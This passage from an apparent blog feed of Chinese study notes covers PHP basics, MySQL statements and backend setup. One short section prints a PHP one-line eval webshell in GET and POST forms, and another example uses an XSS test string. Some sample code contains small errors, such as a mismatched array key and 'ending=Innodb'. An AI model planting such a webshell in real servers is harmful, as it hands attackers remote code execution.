title="解释性语言与编译型语言"></a>解释性语言与编译型语言</h4><ol><li>解释型语言<blockquote><p>如：<code>Php</code>，<code>phthon</code>，<code>shel</code><br>由上到下解释每一行<br>特点：每次使用，每次解释，且需要解释器<br>兼容性问题基本没有</p></blockquote></li></ol><ol start="2"><li>编译型语言<blockquote><p>如：<code>C</code>,<code>C++</code>，<code>Java</code><br>需要编译才能执行（将文本文件<code>test.c</code>编译成二进制文件<code>test.exe</code>）<br>编译后生成二进制文件，让系统执行<br>特点：一次编译，多次使用；但跨平台性较弱，需要修改源码。<br>比如c语言有如下两个标准：</p><blockquote><p><code>c90+win</code>编译标准<br><code>c99+linux</code>编译标准<br>他们不能通用</p></blockquote></blockquote></li></ol><hr><h4 id="PHP与JSP"><a href="#PHP与JSP" class="headerlink" title="PHP与JSP"></a>PHP与JSP</h4><p>PHP适用于小型网站<br>JSP遵循java语法，且用于大型网站<br>中型网站两者混用</p><hr><h4 id="字符转义"><a href="#字符转义" class="headerlink" title="字符转义"></a>字符转义</h4><p>例子：</p><blockquote><p>使用php输出that’s ok</p><ol><li>使用双引号中插入单引号</li><li>使用单引号，但时加上转义字符<code>\</code></li></ol></blockquote><hr><h4 id="PHP中布尔类型特点"><a href="#PHP中布尔类型特点" class="headerlink" title="PHP中布尔类型特点"></a>PHP中布尔类型特点</h4><p>只要“错”就是“空”，但是一旦被赋为某种类型，就与“空”没有关系了</p><p>PHP是弱类型<br>eg:<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">$a = <span class="hljs-number">1</span>;$b=<span class="hljs-keyword">true</span>;<br>var_dump($a==$b);<span class="hljs-comment">// Result is true</span><br></code></pre></td></tr></table></figure></p><hr><h4 id="常见网站搭建套路（铁三角）"><a href="#常见网站搭建套路（铁三角）" class="headerlink" title="常见网站搭建套路（铁三角）"></a>常见网站搭建套路（铁三角）</h4><blockquote><p><code>apache/nginx + php + mysql</code> 开源<code>(php)</code>全家桶<br><code>tomcat + jsp + oracle</code>     其中<code>java，oracle</code>不开源<br><code>iis + asp + mssql/access</code>    微软全家桶，贵，功能少，质量差(常见于建站早，更换搭建方式代价极高的网站)</p></blockquote><hr><h4 id="PHP调试错误提示"><a href="#PHP调试错误提示" class="headerlink" title="PHP调试错误提示"></a>PHP调试错误提示</h4><blockquote><p><code>notice</code>：提示，可前面加<code>@</code>屏蔽，如<code>@var_dump</code><br><code>waring</code>：警告<br><code>error</code>：错误</p></blockquote><hr><h4 id="PHP字符占用字节数"><a href="#PHP字符占用字节数" class="headerlink" title="PHP字符占用字节数"></a>PHP字符占用字节数</h4><blockquote><p><code>utf-8</code>，每个中文占3字节<br><code>gbk</code>，每个中文占2字节<br>无论什么编码的英文，每个字母均只占1字节</p></blockquote><p>eg:<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined">echo strlen(&quot;你写的中文&quot;);<br>echo mb_strlen(&quot;你写的中文&quot;);<br></code></pre></td></tr></table></figure></p><hr><h4 id="常见名词的概念"><a href="#常见名词的概念" class="headerlink" title="常见名词的概念"></a>常见名词的概念</h4><blockquote><ul><li>成员变量<br>定义在类内部的变量。该变量的值对外是不可见的，但可通过成员函数访问，在类被实例化为对象后，该变量即可称为对象的属性</li><li>成员函数<br>定义在类的内部，可用于访问对象的数据</li><li>继承<br>继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，吧这个已存在的类所定义的内容作为自己的内容，并加入若干新的内容。</li><li>父类<br>一个类被其他类继承，可将该类称为父类，或基类，或超类</li><li>子类<br>一个类继承其他类称为子类，也可称为派生类</li><li>多态<br>多态性是指相同的函数或方法可用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性</li><li>重载<br>函数或方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互称为重载函数或者方法</li><li>抽象性<br>指具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。</li><li>封装<br>指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。</li><li>构造函数<br>主要用来在创建对象时初始化对象，即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中</li><li>析构函数（destructor）<br>与构造函数相反，当对象结束其生命周期时，系统自动执行（例如在建立对象时用new开辟了一片内存空间，应在推出前在析构函数中用delete释放）</li></ul></blockquote><hr><h4 id="网络安全中的防御"><a href="#网络安全中的防御" class="headerlink" title="网络安全中的防御"></a>网络安全中的防御</h4><blockquote><p>以规则对抗规则，即防御规则对抗攻击规则</p></blockquote><p>例如：写100条防御语句，找到其中没有防御到的语句即可</p><p>fuzz    // 模糊测试</p><h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><p>eval的意思是指将函数体内部的字符当作PHP代码运行<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'a'</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><p>c刀代码（Java写的）<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">'a'</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数据库和SQL</title>
      <link href="/2018/12/15/DB-SQL/"/>
      <url>/2018/12/15/DB-SQL/</url>
      
        <content type="html"><![CDATA[<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><h3 id="定义与概念"><a href="#定义与概念" class="headerlink" title="定义与概念"></a>定义与概念</h3><p>数据库是为了解决数据集中管理上的缺陷而开发出来的数据存储、取用、新增、删除的管理软件，其本质也是对文件进行操作。它的出现使得开发者无需关心它本身如何实现数据管理，只需关注数据本身即可，极大缩短了开发周期。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>数据库分为很多类型与发行版本，常分为：</p><ul><li>层次式</li><li>网络式</li><li>关系型</li></ul><p>而不同的数据库是按不同的数据结构来联系和组织的，在当今互联网中，最常见的数据库模型主要分两种：</p><ul><li>关系型</li><li>非关系型</li></ul><hr><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><h4 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h4><ol><li>数据以表格的形式出现</li><li>每行为各种记录名称</li><li>每列为记录名称所对应的数据域</li><li>许多的行和列组成一张表单</li><li>若干的表单组成database</li></ol><hr><h4 id="常用关键词"><a href="#常用关键词" class="headerlink" title="常用关键词"></a>常用关键词</h4><p><strong>数据库</strong>：一些关联表的集合<br><strong>数据表</strong>：表是数据的矩阵。在一个数据库中的表看起来像是一个简单的电子表格<br><strong>列</strong>：一列（数据元素）包含了相同的数据<br><strong>行</strong>：一行（=元组，或记录）是一组相关的数据<br><strong>主键</strong>：具有唯一性。一个数据包只能包含一个主键。可使用主键来查询数据<br><strong>索引</strong>：使用索引可快速访问数据库表中的特定信息。索引是对数据库表中一列或多列的值进行排序的一种结构。类似于书籍的目录</p><hr><h4 id="MySQL安装登陆"><a href="#MySQL安装登陆" class="headerlink" title="MySQL安装登陆"></a>MySQL安装登陆</h4><p>安装：</p><blockquote><p>通过<code>apt-get</code>安装在ubuntu系统中<br>通过<code>yum</code>安装在centos系统中<br>通过<code>phpstudy</code>运行在windows中（或mysql官网的独立安装包）</p></blockquote><p>登陆：</p><blockquote><p>在Linux中通过<code>mysql -u username -p</code>方式登陆<br>在windows中可以使用命令行登陆，和linux一样。也可使用phpstudy自带图形化工具链接数据库。或使用navicat工具登陆。</p></blockquote><hr><h4 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h4><p><strong>增</strong>：<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment"># 新增数据库</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> <span class="hljs-keyword">name</span>;  <br><br><span class="hljs-comment"># 新增数据表</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> table_name(<br>    column_name column_type<br>)ending=<span class="hljs-keyword">Innodb</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">charset</span>=utf8;<br><br><span class="hljs-comment"># 新增一行数据</span><br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> table_name(field1, field2,...,fieldN)<br><span class="hljs-keyword">values</span>(value1, value2,...,valueN);<br></code></pre></td></tr></table></figure></p><p><strong>删</strong>：<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment"># 删除数据库</span><br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">database</span> dbname;<br><br><span class="hljs-comment"># 删除数据表</span><br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> tablename;<br><br><span class="hljs-comment"># 删除一行或多行数据</span><br><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> tablename <span class="hljs-keyword">where</span> columnname=?;<br></code></pre></td></tr></table></figure></p><p><strong>改</strong><br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment"># 修改数据库</span><br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> tablename <span class="hljs-keyword">drop</span>/<span class="hljs-keyword">add</span>/<span class="hljs-keyword">modify</span> columnname;<br><br><span class="hljs-comment"># 修改一行或多行数据</span><br><span class="hljs-keyword">update</span> tablename <span class="hljs-keyword">set</span> filed1=<span class="hljs-keyword">new</span>-value1,<br></code></pre></td></tr></table></figure></p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h3><p>存放当前“数据库应用”中所用数据的“元数据”</p>]]></content>
      
      
      
        <tags>
            
            <tag> Database </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>后端开发入门</title>
      <link href="/2018/12/12/Back-end/"/>
      <url>/2018/12/12/Back-end/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>本文主要为后端开发做个引子，对常见的或者常用的知识做个简介，包括PHP、MySQL等一些入门级知识。</p><p><strong>注：补充知识放在文末</strong></p><hr><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="定义与概念"><a href="#定义与概念" class="headerlink" title="定义与概念"></a>定义与概念</h3><ul><li>PHP是嵌入HTML页面中的脚本语言</li><li>是目前最流行的网站开发语言</li><li>在几乎所有的平台中都可以运行</li><li>很多的企业都在使用PHP作为开发语言</li></ul><hr><h3 id="Windows10-Sublime配置"><a href="#Windows10-Sublime配置" class="headerlink" title="Windows10 Sublime配置"></a>Windows10 Sublime配置</h3><p><a href="http://www.sublimetext.com/" target="_blank" rel="noopener">Sublime官网</a><br>这里选择windows版下载安装。<br>步骤如下：</p><ol><li>打开Sublime编辑器，输入如下代码：<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs undefined">&#123;<br>&quot;cmd&quot;: [&quot;php&quot;, &quot;$file&quot;],<br>&quot;file_regex&quot;: &quot;php$&quot;,<br>&quot;selector&quot;: &quot;source.php&quot;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>一般保存至默认路径即可，如若默认路径有变，则手动选择如下路径：<br><code>C:\User(用户)\{YourName}\AppData\Roaming\Sublime Text3\Packages\User\</code></p><ol start="2"><li>添加PHP环境变量：<br>在<a href="http://phpstudy.php.cn/" target="_blank" rel="noopener">phpStudy安装</a>目录中，找到php目录下你想使用的对应php版本，比如这里我选择php-7.0.12-nts。<br>进入文件夹，复制路径。</li></ol><p>打开系统环境变量添加所复制的路径，这里我使用如下方法：</p><blockquote><p>右击计算机–&gt;属性–&gt;高级系统设置–&gt;环境变量–&gt;系统变量</p></blockquote><p>找到变量Path，编辑并新建值，复制php路径，确认并退出。</p><ol start="3"><li><p>在Sublime编辑器选项卡中依次打开：<br><code>Tools--&gt;Build System--&gt;php</code><br>这里会出现<code>php</code>选项，是由于第一步文件的配置以及第二步环境变量配置均无误，否则将不会出现这个选项。</p></li><li><p>配置完成<br>快捷键：<code>Ctrl + b</code>即可输出显示php被解释后的运行结果。</p></li></ol><hr><h3 id="基础规范"><a href="#基础规范" class="headerlink" title="基础规范"></a>基础规范</h3><blockquote><ol><li>PHP脚本以<code>&lt;?php</code>开始，以<code>?&gt;</code>结束为规范写法。若为最后一行，可以省略<code>?&gt;</code></li><li>PHP 脚本可以单独存在，也可以与html页面结合</li><li>php文件扩展名规范，一般是<code>.php</code>结尾。但是，也可以使用其他命名，如<code>.phtml</code>等，具体是定义在配置文件中的。</li></ol></blockquote><hr><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><blockquote><p>布尔类型<code>（bool）</code><br>整型<code>（int）</code><br>浮点型<code>（float）</code><br>字符串<code>（string)</code><br>资源<code>（resource）</code><br>空类型<code>（NULL）</code><br>数组<code>（array）</code><br>对象<code>（class）</code></p></blockquote><p>一般可使用<code>var_dump()</code>来查看类型</p><h3 id="变量与常量"><a href="#变量与常量" class="headerlink" title="变量与常量"></a>变量与常量</h3><p>常量：</p><blockquote><p>一旦赋值不会改变，且应尽量使用大写。<br>常量分为系统常量和自定义常量。<br>系统常量可以理解为值不会有改变的量</p></blockquote><p>定义常量</p><blockquote><p>使用PHP中的函数<code>define()</code>定义自定义常量<br>常量在使用时，不需要<code>$</code>符号<br>常用定义：<code>Define(&#39;ROOT&#39;,&#39;localhost&#39;);</code></p></blockquote><p>常用系统常量：</p><blockquote><p><code>__FILE__</code>：php程序文件名/绝对路径<br><code>__DIR__</code>：被调用的文件脚本所在目录<br><code>__FUNCTION__</code>：函数名<br><code>__LINE__</code>：PHP程序文件行数<br><code>PHP_VERSION</code>：当前解析器的版本号<br><code>PHP_OS</code>：执行当前PHP版本的操作系统名称</p></blockquote><hr><p>变量：</p><blockquote><p>变量以<code>$</code>符开始，后面跟着变量名称<br>变量必须以字母或下划线字符开始、只能包含字母数字字符以及下划线（A-z、0-9和_）<br>变量名不能包含空格，且区分大小写。</p></blockquote><hr><h3 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h3><p>输出：<br><code>echo、print、printf、sprintf、print_r、die、var_dump</code></p><p>输入：<br>cli命令行模式接收参数：三种方式</p><blockquote><p>使用argv数组、使用getopt方法、提示用户输入</p></blockquote><p>argv：<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs undefined">&lt;?php<br>/**<br> * 使用 $argc $argv 接受参数<br> */<br> <br>echo &quot;接收到&#123;$argc&#125;个参数&quot;;<br>print_r($argv);<br>?&gt;<br></code></pre></td></tr></table></figure></p><p>getopt:<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs undefined">&lt;?php<br>/**<br> * 使用 getopt函数<br> */<br> <br>$param_arr = getopt(&apos;a:b:&apos;);<br>print_r($param_arr);<br>?&gt;<br></code></pre></td></tr></table></figure></p><p>提示用户输入：<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs undefined">&lt;?php<br>/**<br> * 提示用户输入，类似Python<br> */<br>fwrite(STDOUT,&apos;请输入您的博客名：&apos;);<br>echo &apos;您输入的信息是：&apos;.fgets(STDIN);<br>?&gt;<br></code></pre></td></tr></table></figure></p><p><strong>php的单双引号都能输出字符串，双引号中内部变量会解析，但在单引号中不会。</strong></p><hr><h3 id="EOF"><a href="#EOF" class="headerlink" title="EOF"></a>EOF</h3><p>PHP EOF(heredoc)是一种在命令行shell（如sh、csh、ksh、bash、PowerShell和zsh）和程序语言（像Perl、PHP、Python和Ruby）里定义一个字串的方法。</p><p>使用概述：</p><blockquote><ol><li>必须后接分号，否则编译不通过</li><li>EOF可以用任意其它字符代替，只需保证结束标识与开始标识一致</li><li>结束标识必须顶格独自占一行，前后不能衔接任何空白字符</li><li>开始标识可以不单引号或双引号，不带引号与带双引号效果一致，均解释内嵌的变量和转义符号，但带单引号则不解释。</li><li>当内容需要内嵌引号（单、双引号）时，不需要加转义符，本身对单双引号转义。</li></ol></blockquote><hr><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p>比较运算符：</p><blockquote><p>大于、小于、等于等运算，它们的结果都是bool值类型</p></blockquote><p>逻辑运算符：</p><blockquote><p>与或非运算<br>and或&amp;&amp;    or或||    not或!<br>它们的结果都是bool值</p></blockquote><hr><h3 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h3><p>常用字符串操作：</p><blockquote><p><code>.</code> 拼接运算符<br><code>addslashes()</code> 将预定义的字符（可能出现歧义的字符）添加反斜杠转义<code>\</code><br><code>bin2hex()</code> 将ASCII字符串转换为16进制<br><code>chr()</code> 将指定的ASCII值转换成字符<br><code>chop()</code> 移除字符串右侧字符，由自己指定，默认为空白字符<br><code>strlen() mb_strlen()</code> 长度计算，区别：<code>mb_strlen</code>可以计算中文字符串长度<br><code>crypt()</code> 对字符串单项加密，不可逆转，类似于做MD5值<br><code>htmlentities()</code> 将字符串转换为html实体(可用于防御xss攻击)<br>例如：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> htmlentities(<span class="hljs-string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>);<br></code></pre></td></tr></table></figure></p></blockquote><blockquote><p><code>implode()</code> 返回一个由数组元素组合成的字符串，与<code>explode()</code>作用相反<br><code>md5()</code> 计算字符串的MD5值<br><code>md5_file()</code> 计算文件的MD5值<br><code>str_replace()</code> 替换字符串中的一部分（大小写<strong>敏感</strong>）<br><code>str_ireplace()</code> 替换字符串中的一部分（大小写<strong>不敏感</strong>）<br><code>str_split()</code> 把字符串分割到数组中，php4/5/7均支持，但无法按照指定的字符来做分割，split函数可以按照指定的字符来分割，与explode函数用法类似，split函数仅可在php4/5中使用，php7废除了此用法<br><code>strcmp</code> 比较两个字符串（大小写<strong>敏感</strong>）</p><blockquote><p>在<code>UTF-8</code>中，每个中文3字节<br>在<code>GBK</code>中，每个中文2字节<br>无论什么编码，英文每个字母占1字节</p></blockquote></blockquote><hr><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><ul><li><p>强制转换：(数据类型)数据变量</p><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(int)$var  (string)$var  (float)$var  (bool)$var<br></code></pre></td></tr></table></figure></li><li><p>使用具体类型函数转换</p><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">intval()  floatval()  strval()<br></code></pre></td></tr></table></figure></li><li><p>使用通用类型转换函数</p><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">settype(mixed <span class="hljs-keyword">var</span>, string type)<br></code></pre></td></tr></table></figure></li></ul><hr><h3 id="PHP是弱类型"><a href="#PHP是弱类型" class="headerlink" title="PHP是弱类型"></a>PHP是弱类型</h3><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">$a = <span class="hljs-number">1</span>;  $b = <span class="hljs-keyword">true</span>;<br>var_dump($a == $b);  <span class="hljs-comment">// 结果为true</span><br><br>var_dump((int)$b);<br>var_dump((int)str_replace(<span class="hljs-string">"1"</span>, <span class="hljs-string">""</span>, $a));<br></code></pre></td></tr></table></figure><hr><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>数组是特殊的变量，可以在单个变量中同时保存一个或一个以上的值，并可以同通过下标来访问其中某一个的值。用<code>array()</code>函数创建。同时PHP中数组可以存储任意类型的数据。<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">$arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">'I am'</span>, <span class="hljs-string">'a'</span>, <span class="hljs-string">'array'</span>);<br></code></pre></td></tr></table></figure></p><p>PHP中数组可分为索引数组和关联数组，第三种叫多维数组</p><blockquote><p>索引数组：是指数组的键是整数的数组，且键的整数顺序从<code>0</code>开始<br>关联数组：是一种具有特殊索引方式的数组。不仅可以通过整数来索引它，还可以使用字符串或者其他类型的值（除了NULL）来索引它。</p></blockquote><hr><h4 id="赋值方式："><a href="#赋值方式：" class="headerlink" title="赋值方式："></a>赋值方式：</h4><ol><li>数组变量名后加一个中括号的方式赋值。且键一定为整数。<br><code>$a[1] = 0</code></li><li>用<code>array()</code>创建一个空数组，用<code>=&gt;</code>分隔左侧键和右侧值。</li><li>用<code>array()</code>创建一个空数组，直接在数组里用英文单引号或双引号赋值，数组会默认建立从0开始的整数的键</li></ol><h4 id="输出方式"><a href="#输出方式" class="headerlink" title="输出方式"></a>输出方式</h4><p>常用：</p><ol><li><p>直接使用键输出：</p><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    $score = <span class="hljs-keyword">array</span>(<span class="hljs-string">"Math"</span> =&gt; <span class="hljs-string">"数学"</span>);<br>    $scoreMaths = $score[<span class="hljs-string">"Maths"</span>];<br>    <span class="hljs-keyword">echo</span> $scoreMaths;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>使用foreach输出：</p><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    $project = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">"china"</span> =&gt; <span class="hljs-string">"语文"</span>,<br>        <span class="hljs-string">"Maths"</span> =&gt; <span class="hljs-string">"数学"</span>,<br>        <span class="hljs-string">"English"</span> =&gt; <span class="hljs-string">"英语"</span><br>    );<br><br>    <span class="hljs-keyword">foreach</span> ($project <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br /&gt;"</span>;<br>    <span class="hljs-keyword">echo</span> $key.<span class="hljs-string">"是"</span>.$value.<span class="hljs-string">"。"</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> $project[<span class="hljs-string">"Maths"</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li></ol><hr><h4 id="常用操作技巧"><a href="#常用操作技巧" class="headerlink" title="常用操作技巧"></a>常用操作技巧</h4><ul><li><code>count()</code>和<code>sizeof()</code> 统计数组下标个数，获取数组长度</li><li><code>each()</code> 返回当前元素键名和键值，并将内部指针向前移动</li><li><code>list()</code> 用于在一次操作中给一组变量赋值</li><li><code>sort()、asort()、ksort()</code> 正向排序</li><li><code>rsort()、arsort()、krsort()</code> 反向排序</li><li><code>array_count_values()</code> 统计数组下标值的个数</li><li><code>current()</code> 每个数组都有一个内部指针指向他的当前单元，初始指向插入到数组中的第一个元素</li><li><code>array_pad()</code> 数组之间首尾选择性追加</li><li><code>unset()</code> 销毁指定的变量</li><li><code>array_fill()</code> 用键值填充数组</li><li><code>array_combine()</code> 同过合并两个数组来创建一个新数组，其中一个数组元素为键名，另一个为键值</li><li><code>array_splice()</code> 从数组中移除元素，并用新元素取代它</li><li><code>array_unique()</code> 删除数组中重复值</li><li><code>array_flip()</code> 交换数组的键值和值</li><li><code>array_search()</code> 搜索数值</li></ul><hr><h4 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h4><p>通过参数列表可以传递信息到函数（以逗号作为分隔符）的表达式列表。参数类似于一个变量，通过传递参数可以使函数实现对参数的运算。<br>参数可以是任意类型的数据，具体要根据函数功能来确定。</p><hr><h4 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h4><p>常见：<br><code>isset()</code> 判断变量是否存在<br><code>strlen()</code> 计算字符串长度<br><code>var_dump()</code> 输出变量类型和具体内容（常用于调试）<br><code>mysql_connect()</code> 链接数据库<br><code>function_exists()</code> 判断函数是否存在</p><hr><h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><p>编写一个函数，实现计算两个数大小比较，并返回最大值：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// return the max of the two</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">maxofmine</span><span class="hljs-params">($a, $b)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>($a &lt; $b) &#123;<br>        <span class="hljs-keyword">return</span> $b;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> $a;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></p><p>编写一个函数，实现将两个数的值进行交换，无返回值：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// swap two variable's value</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">swap</span><span class="hljs-params">(&amp;$a, &amp;$b)</span> </span>&#123;<br>    $tmp = $a;  $a = $b;  $b = $tmp;<br>&#125;<br></code></pre></td></tr></table></figure></p><p>用函数实现<code>array_flip()</code><br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// function array_flip() implementation</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">array_flip_mine</span><span class="hljs-params">($array)</span> </span>&#123;<br>    <span class="hljs-keyword">foreach</span> ($array <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;<br>        $arraytmp[] = <span class="hljs-keyword">array</span>($value =&gt; $key);<br>    &#125;<br>    <span class="hljs-keyword">return</span> $arraytmp;<br>&#125;<br></code></pre></td></tr></table></figure></p><hr><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><h4 id="打开"><a href="#打开" class="headerlink" 